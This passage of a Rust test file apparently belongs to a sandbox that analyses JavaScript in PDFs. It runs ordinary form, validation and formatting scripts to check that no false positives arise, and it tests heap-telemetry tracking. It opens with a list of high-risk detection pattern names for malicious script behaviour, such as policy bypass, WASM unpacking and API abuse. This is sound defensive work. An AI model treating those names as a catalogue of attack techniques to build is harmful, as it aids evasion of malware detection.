    "dom_sink_policy_bypass_attempt",
    "wasm_memory_unpacker_pipeline",
    "extension_api_abuse_probe",
    "interaction_coercion_loop",
    "capability_matrix_fingerprinting",
    "api_call_sequence_malicious",
    "source_sink_complexity",
    "entropy_at_sink",
    "dynamic_string_materialisation_sink",
];

#[cfg(feature = "js-sandbox")]
fn assert_no_high_risk_patterns(signals: &js_analysis::DynamicSignals, context: &str) {
    for name in HIGH_RISK_PATTERNS {
        assert!(
            !signals.behavioral_patterns.iter().any(|p| p.name == *name),
            "{}: benign payload unexpectedly flagged '{}'; patterns: {:?}",
            context,
            name,
            signals.behavioral_patterns.iter().map(|p| &p.name).collect::<Vec<_>>()
        );
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_pdf_form_calculation_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var qty = getField('quantity').value;
        var price = getField('price').value;
        var total = qty * price;
        var gst = total * 0.10;
        getField('total').value = total + gst;
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "pdf_form_calculation");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_arithmetic_and_variables_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var x = 42;
        var y = 3.14159;
        var z = (x * y) / (x - y);
        var flag = z > 100;
        var result = flag ? 'large' : 'small';
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "arithmetic_and_variables");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_string_formatting_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var amount = 1234.5;
        var formatted = '$' + amount.toFixed(2);
        var padded = ('000000' + '42').slice(-6);
        var upper = 'hello world'.toUpperCase();
        var trimmed = '  spaces  '.trim();
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "string_formatting");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_pdf_page_navigation_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var total = numPages;
        var current = pageNum;
        if (current < total - 1) {
            pageNum = current + 1;
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "pdf_page_navigation");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_pdf_print_preparation_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var pp = getPrintParams();
        pp.interactive = pp.constants.interactionLevel.automatic;
        pp.printerName = '';
        print(pp);
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "pdf_print_preparation");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_array_processing_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var items = ['banana', 'apple', 'cherry', 'date'];
        items.sort();
        var lengths = [];
        for (var i = 0; i < items.length; i++) {
            lengths.push(items[i].length);
        }
        var total = 0;
        for (var j = 0; j < lengths.length; j++) {
            total += lengths[j];
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "array_processing");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_date_formatting_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var now = new Date();
        var day = now.getDate();
        var month = now.getMonth() + 1;
        var year = now.getFullYear();
        var formatted = day + '/' + month + '/' + year;
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "date_formatting");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_try_catch_error_handling_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        try {
            var value = getField('optional_field').value;
        } catch (e) {
            var value = 'default';
        }
        app.alert('Value is: ' + value);
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "try_catch_error_handling");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_regex_validation_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var email = getField('email').value;
        var pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
        if (!pattern.test(email)) {
            app.alert('Please enter a valid email address.');
        }
        var phone = getField('phone').value;
        var phonePattern = /^\\d{3}-\\d{3}-\\d{4}$/;
        if (!phonePattern.test(phone)) {
            app.alert('Please enter a valid phone number.');
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "regex_validation");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_field_visibility_toggle_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var choice = getField('document_type').value;
        if (choice == 'passport') {
            getField('passport_number').display = display.visible;
            getField('driver_licence').display = display.hidden;
        } else {
            getField('passport_number').display = display.hidden;
            getField('driver_licence').display = display.visible;
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "field_visibility_toggle");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_multi_field_form_validation_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var errors = [];
        var name = getField('name').value;
        if (name.length == 0) { errors.push('Name is required'); }
        var age = getField('age').value;
        if (age < 0 || age > 150) { errors.push('Invalid age'); }
        var address = getField('address').value;
        if (address.length > 200) { errors.push('Address too long'); }
        if (errors.length > 0) {
            app.alert('Errors:\\n' + errors.join('\\n'));
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "multi_field_form_validation");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_pdf_annotation_display_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var count = numPages;
        var message = 'This document has ' + count + ' pages.';
        app.alert(message);
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "pdf_annotation_display");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_conditional_field_colouring_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var balance = getField('balance').value;
        if (balance < 0) {
            getField('balance').textColor = color.red;
        } else if (balance > 1000) {
            getField('balance').textColor = color.green;
        } else {
            getField('balance').textColor = color.black;
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "conditional_field_colouring");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_object_construction_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var config = {
            title: 'Report',
            version: 2,
            pages: [1, 2, 3, 4, 5]
        };
        var summary = config.title + ' v' + config.version;
        var pageCount = config.pages.length;
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "object_construction");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_math_rounding_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var values = [10.456, 20.789, 30.123, 40.567, 50.890];
        var sum = 0;
        for (var i = 0; i < values.length; i++) {
            sum += Math.round(values[i] * 100) / 100;
        }
        var avg = sum / values.length;
        var rounded = Math.ceil(avg);
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "math_rounding");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn benign_table_of_contents_builder_no_false_positives() {
    let options = DynamicOptions::default();
    let payload = b"
        var toc = '';
        var sections = ['Introduction', 'Methods', 'Results', 'Discussion'];
        for (var i = 0; i < sections.length; i++) {
            toc += (i + 1) + '. ' + sections[i] + '\\n';
        }
        getField('toc_field').value = toc;
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_no_high_risk_patterns(&signals, "table_of_contents_builder");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_tracks_heap_allocation_view_and_access_telemetry() {
    let options = DynamicOptions::default();
    let payload = br#"
        var buf = new ArrayBuffer(64);
        var view = new Uint8Array(buf);
        view.set([1, 2, 3, 4]);
        var dv = new DataView(buf);
        dv.setUint8(0, 0x41);
        dv.getUint8(0);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.heap_allocation_count >= 2);
            assert!(signals.heap_view_count >= 1);
            assert!(signals.heap_access_count >= 2);
            assert!(signals.heap_allocations.iter().any(|entry| entry.starts_with("ArrayBuffer")));
            assert!(signals.heap_allocations.iter().any(|entry| entry.starts_with("Uint8Array")));
            assert!(signals.heap_views.iter().any(|entry| entry.starts_with("DataView")));
            assert!(signals.heap_accesses.iter().any(|entry| entry.contains("DataView.setUint8")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_tracks_heap_telemetry_truncation_caps() {
    let options = DynamicOptions::default();
    let mut payload = String::from("var b=new ArrayBuffer(8);var d=new DataView(b);");
    for _ in 0..1_300 {
        payload.push_str("d.getUint8(0);");
    }
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert_eq!(signals.heap_accesses.len(), 1_024);
            assert!(signals.truncation.heap_accesses_dropped > 0);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(not(feature = "js-sandbox"))]
#[test]
fn sandbox_reports_unavailable_without_feature() {
    let options = DynamicOptions::default();
    let outcome = js_analysis::run_sandbox(b"alert(1)", &options);
    match outcome {
        DynamicOutcome::Skipped { reason, .. } => assert_eq!(reason, "sandbox_unavailable"),
        _ => panic!("expected skip"),
    }
}
